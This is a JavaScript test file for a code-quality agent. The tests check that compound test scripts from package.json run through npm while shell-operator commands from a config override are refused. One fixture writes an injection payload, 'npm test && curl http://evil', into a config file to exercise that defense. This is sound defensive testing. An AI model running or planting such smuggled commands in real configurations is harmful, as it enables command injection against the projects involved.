'use strict';

/**
 * SCRIPT-DERIVED test commands run via the npm LAUNCHER (repair of plan 00203 finding F1).
 *
 * Plan 00203 made the quality agent run every CONFIGURED lint/typecheck/test command as an
 * argv vector (shell:false) and REFUSE any command carrying shell structure (`&&`, `|`, …).
 * That is correct for the `.ctoc`-config attack surface. But `tool-detector.js` sets
 * `tools.test` to the VERBATIM `package.json` `scripts.test` — and a hugely common benign
 * pattern (`"test": "jest && tsc --noEmit"`, `"test": "npm run lint && npm run test:unit"`)
 * carries `&&`. So on any normal Node project that installs CTOC, the full-test fallback
 * REFUSED the project's own checked-in test script and blocked `/ctoc:push`.
 *
 * The repair: a command DERIVED FROM a package.json script is the project's own trusted,
 * checked-in file — it is launched through npm as a 2-token argv (`npm test`, shell:false)
 * and npm executes the project-owned compound internally. NO shell reaches the quality
 * agent. A genuinely-external configured command (from `.ctoc/quality-config.yaml` or a
 * capability file) STILL goes through parse-or-refuse, so the injection defense is intact.
 *
 * Provenance is carried on the detected tool object as `testFromScript`; a `.ctoc`-config
 * `test` override CLEARS it (an override is the untrusted surface, never a project script).
 *
 * Cross-platform: node one-liners, path.join, os.tmpdir, env-var proof path (nothing is
 * written into this repository), npm launcher spelled `npm`/`npm.cmd` per platform.
 */

const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

const qualityAgent = require('../src/lib/quality-agent');
const toolDetector = require('../src/lib/tool-detector');
const { runFullTests } = qualityAgent;

function mkTmp(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}
function rm(dir) {
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* best effort */ }
}
async function captureLog(fn) {
  const orig = console.log;
  console.log = () => {};
  try { return await fn(); } finally { console.log = orig; }
}

describe('a package.json scripts.test compound is launched via npm, not refused', () => {
  let proof;
  before(() => {
    proof = path.join(mkTmp('ctoc-launcher-proof-'), 'RAN');
    process.env.CTOC_LAUNCHER_PROOF = proof;
  });
  after(() => {
    delete process.env.CTOC_LAUNCHER_PROOF;
    rm(path.dirname(proof));
  });

  it('carries script provenance and RUNS the benign compound via npm (proof written, not refused)', async () => {
    const proj = mkTmp('ctoc-launcher-');
    const origCwd = process.cwd();
    try {
      // A compound script: the SECOND clause (after &&) writes the proof file, so the proof
      // existing is evidence npm executed the WHOLE compound — impossible if the command had
      // been refused (F1) or truncated at the first token.
      fs.writeFileSync(path.join(proj, 'package.json'), JSON.stringify({
        name: 'x', version: '1.0.0',
        scripts: {
          test: 'node -e "process.exit(0)" '
            + '&& node -e "require(\'fs\').writeFileSync(process.env.CTOC_LAUNCHER_PROOF,\'ran\')"'
        }
      }));

      const detection = toolDetector.detectTools(proj);
      assert.ok(detection.tools.javascript.test.includes('&&'),
        'precondition: the detected test command is a compound carrying &&');
      assert.equal(detection.tools.javascript.testFromScript, true,
        'a package.json scripts.test must carry script provenance');

      // The quality agent runs in the project cwd (execFileSync inherits process.cwd()).
      process.chdir(proj);
      const res = await captureLog(() => runFullTests(detection.tools));

      assert.notEqual(res.refused, true, 'a package-script compound must NOT be refused');
      assert.equal(fs.existsSync(proof), true,
        'npm must have launched the whole compound script (the after-&& clause wrote the proof)');
      assert.equal(res.passed, true, 'a benign compound test script passes');
    } finally {
      process.chdir(origCwd);
      rm(proj);
    }
  });

  it('a genuinely failing package script still FAILS (launched, not refused)', async () => {
    const proj = mkTmp('ctoc-launcher-fail-');
    const origCwd = process.cwd();
    try {
      fs.writeFileSync(path.join(proj, 'package.json'), JSON.stringify({
        name: 'x', version: '1.0.0',
        scripts: { test: 'node -e "process.exit(0)" && node -e "process.exit(1)"' }
      }));
      const detection = toolDetector.detectTools(proj);
      assert.equal(detection.tools.javascript.testFromScript, true);
      process.chdir(proj);
      const res = await captureLog(() => runFullTests(detection.tools));
      assert.notEqual(res.refused, true, 'a non-zero exit is a FAILURE, not a refusal');
      assert.equal(res.passed, false, 'a script whose second clause exits non-zero fails');
    } finally {
      process.chdir(origCwd);
      rm(proj);
    }
  });
});

describe('the injection defense is intact — an external .ctoc-config test command is still refused', () => {
  it('a quality-config.yaml test override with a shell operator is REFUSED, provenance cleared', async () => {
    const proj = mkTmp('ctoc-launcher-cfg-');
    try {
      // scripts.test would set testFromScript; the config override REPLACES test and must
      // CLEAR the provenance — a config override is the agent-writable attack surface, never
      // a trusted project script, so it goes through parse-or-refuse.
      fs.writeFileSync(path.join(proj, 'package.json'), JSON.stringify({
        name: 'x', version: '1.0.0', scripts: { test: 'node -e "process.exit(0)"' }
      }));
      fs.mkdirSync(path.join(proj, '.ctoc'), { recursive: true });
      fs.writeFileSync(path.join(proj, '.ctoc', 'quality-config.yaml'),
        'languages:\n  javascript:\n    test: npm test && curl http://evil\n');

      const detection = toolDetector.detectTools(proj);
      assert.equal(detection.tools.javascript.test, 'npm test && curl http://evil',
        'the shell-operator test override reaches langTools verbatim (defect precondition)');
      assert.notEqual(detection.tools.javascript.testFromScript, true,
        'a config override is NOT script-derived — provenance must be cleared so it is parsed');

      const res = await captureLog(() => runFullTests(detection.tools));
      assert.equal(res.passed, false, 'the external config compound is refused, never launched');
      assert.match(String(res.output), /refus/i,
        'an external config command with shell structure must be REFUSED, not run via npm');
    } finally {
      rm(proj);
    }
  });
});
